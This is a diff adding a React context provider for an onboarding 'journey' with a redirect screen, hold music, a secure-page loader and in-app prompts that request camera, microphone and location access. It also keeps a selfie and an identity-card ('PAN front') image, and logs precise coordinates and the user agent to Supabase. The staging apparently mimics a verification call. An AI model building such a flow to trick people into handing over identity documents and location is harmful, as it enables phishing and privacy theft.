@@ -1,0 +1,269 @@
+'use client';
+
+import {
+  createContext,
+  useCallback,
+  useContext,
+  useEffect,
+  useMemo,
+  useRef,
+  useState,
+  type ReactNode,
+} from 'react';
+import { OB_SEQUENCE, PERM_INFO, type PermKind, type Screen } from './journey';
+import {
+  emptyPermResults,
+  requestCamera,
+  requestLocation,
+  requestMicrophone,
+  type PermResults,
+} from './permissions';
+import { saveUnityRough } from './supabase';
+import { useHoldMusic } from './useHoldMusic';
+
+interface PermPopup {
+  open: boolean;
+  kind: PermKind | null;
+}
+
+interface CameraState {
+  stream: MediaStream | null;
+  failed: boolean;
+}
+
+interface JourneyValue {
+  screen: Screen;
+  go: (screen: Screen) => void;
+  /** Restart the whole journey (hang-up / loop back to the secure-page loader). */
+  restart: () => void;
+
+  camera: CameraState;
+  holdMusic: ReturnType<typeof useHoldMusic>;
+
+  // Onboarding (permissions) sequence
+  permPopup: PermPopup;
+  permInfo: typeof PERM_INFO;
+  startOnboarding: () => void;
+  obProceed: () => void;
+  permRespond: (allow: boolean) => void;
+
+  // Shared capture artefacts
+  selfieUrl: string | null;
+  setSelfieUrl: (url: string | null) => void;
+  panFrontUrl: string | null;
+  setPanFrontUrl: (url: string | null) => void;
+}
+
+const JourneyCtx = createContext<JourneyValue | null>(null);
+
+export function useJourney(): JourneyValue {
+  const ctx = useContext(JourneyCtx);
+  if (!ctx) throw new Error('useJourney must be used inside <JourneyProvider>');
+  return ctx;
+}
+
+function newSessionId(): string {
+  try {
+    return crypto.randomUUID();
+  } catch {
+    return `${Date.now()}-${Math.random().toString(16).slice(2)}`;
+  }
+}
+
+export function JourneyProvider({ children }: { children: ReactNode }) {
+  const [screen, setScreen] = useState<Screen>('redirect');
+  const holdMusic = useHoldMusic();
+
+  // Camera stream is acquired lazily, only once the user grants the camera
+  // permission during onboarding — not on page load.
+  const [stream, setStream] = useState<MediaStream | null>(null);
+  const [camFailed, setCamFailed] = useState(false);
+  const streamRef = useRef<MediaStream | null>(null);
+
+  const [obIndex, setObIndex] = useState(-1); // -1 => not onboarding
+  const [permPopup, setPermPopup] = useState<PermPopup>({ open: false, kind: null });
+
+  const [selfieUrl, setSelfieUrl] = useState<string | null>(null);
+  const [panFrontUrl, setPanFrontUrl] = useState<string | null>(null);
+
+  // Collected across the permission steps; read when we persist to Supabase.
+  const permResultsRef = useRef<PermResults>(emptyPermResults());
+  const sessionIdRef = useRef<string>('');
+  if (!sessionIdRef.current) sessionIdRef.current = newSessionId();
+
+  const obTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const permTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  const clearObTimers = useCallback(() => {
+    if (obTimer.current) clearTimeout(obTimer.current);
+    if (permTimer.current) clearTimeout(permTimer.current);
+    obTimer.current = null;
+    permTimer.current = null;
+  }, []);
+
+  const stopStream = useCallback(() => {
+    streamRef.current?.getTracks().forEach((t) => t.stop());
+    streamRef.current = null;
+    setStream(null);
+  }, []);
+
+  const go = useCallback(
+    (next: Screen) => {
+      clearObTimers();
+      setObIndex(-1);
+      setPermPopup({ open: false, kind: null });
+      setScreen(next);
+    },
+    [clearObTimers]
+  );
+
+  const advanceOnboard = useCallback(() => {
+    setObIndex((i) => i + 1);
+  }, []);
+
+  const startOnboarding = useCallback(() => {
+    permResultsRef.current = emptyPermResults();
+    sessionIdRef.current = newSessionId();
+    setObIndex(0);
+  }, []);
+
+  const obProceed = useCallback(() => {
+    advanceOnboard();
+  }, [advanceOnboard]);
+
+  // "Allow" / "Deny" on the in-app prompt. Allow triggers the REAL browser
+  // permission request (native OS prompt) for the current step's kind.
+  const permRespond = useCallback(
+    async (allow: boolean) => {
+      setPermPopup({ open: false, kind: null });
+      const step = OB_SEQUENCE[obIndex];
+      const kind = step?.perm;
+      const results = permResultsRef.current;
+
+      if (!kind) {
+        advanceOnboard();
+        return;
+      }
+
+      if (allow) {
+        if (kind === 'camera') {
+          const { granted, stream: s } = await requestCamera();
+          if (s) {
+            streamRef.current = s;
+            setStream(s);
+          }
+          setCamFailed(!granted);
+          results.camera = granted;
+        } else if (kind === 'microphone') {
+          results.microphone = (await requestMicrophone()).granted;
+        } else if (kind === 'location') {
+          const r = await requestLocation();
+          results.location = r.granted;
+          results.latitude = r.latitude;
+          results.longitude = r.longitude;
+          results.accuracy = r.accuracy;
+        }
+      } else {
+        if (kind === 'camera') {
+          results.camera = false;
+          setCamFailed(true);
+        } else if (kind === 'microphone') {
+          results.microphone = false;
+        } else if (kind === 'location') {
+          results.location = false;
+        }
+      }
+
+      advanceOnboard();
+    },
+    [obIndex, advanceOnboard]
+  );
+
+  // Drive the onboarding sequence whenever the index changes.
+  useEffect(() => {
+    if (obIndex < 0) return;
+    clearObTimers();
+
+    if (obIndex >= OB_SEQUENCE.length) {
+      setObIndex(-1);
+      // Persist the collected permission + location data for this run.
+      void saveUnityRough({
+        session_id: sessionIdRef.current,
+        camera_granted: permResultsRef.current.camera,
+        microphone_granted: permResultsRef.current.microphone,
+        location_granted: permResultsRef.current.location,
+        latitude: permResultsRef.current.latitude,
+        longitude: permResultsRef.current.longitude,
+        accuracy: permResultsRef.current.accuracy,
+        user_agent: typeof navigator !== 'undefined' ? navigator.userAgent : null,
+      });
+      setScreen('prepare');
+      return;
+    }
+
+    const step = OB_SEQUENCE[obIndex];
+    setScreen(step.screen);
+
+    if (step.perm) {
+      const kind = step.perm;
+      permTimer.current = setTimeout(() => setPermPopup({ open: true, kind }), 450);
+    } else if (step.dur != null) {
+      obTimer.current = setTimeout(() => advanceOnboard(), step.dur);
+    }
+    // dur === null && no perm => obPermIntro, waits for obProceed()
+
+    return clearObTimers;
+  }, [obIndex, advanceOnboard, clearObTimers]);
+
+  const restart = useCallback(() => {
+    if (typeof window !== 'undefined' && 'speechSynthesis' in window) {
+      window.speechSynthesis.cancel();
+    }
+    holdMusic.stopHold();
+    clearObTimers();
+    stopStream();
+    setCamFailed(false);
+    permResultsRef.current = emptyPermResults();
+    sessionIdRef.current = newSessionId();
+    setObIndex(-1);
+    setPermPopup({ open: false, kind: null });
+    setSelfieUrl(null);
+    setPanFrontUrl(null);
+    setScreen('redirect');
+  }, [holdMusic, clearObTimers, stopStream]);
+
+  const value = useMemo<JourneyValue>(
+    () => ({
+      screen,
+      go,
+      restart,
+      camera: { stream, failed: camFailed },
+      holdMusic,
+      permPopup,
+      permInfo: PERM_INFO,
+      startOnboarding,
+      obProceed,
+      permRespond,
+      selfieUrl,
+      setSelfieUrl,
+      panFrontUrl,
+      setPanFrontUrl,
+    }),
+    [
+      screen,
+      go,
+      restart,
+      stream,
+      camFailed,
+      holdMusic,
+      permPopup,
+      startOnboarding,
+      obProceed,
+      permRespond,
+      selfieUrl,
+      panFrontUrl,
+    ]
+  );
+
+  return <JourneyCtx.Provider value={value}>{children}</JourneyCtx.Provider>;
+}
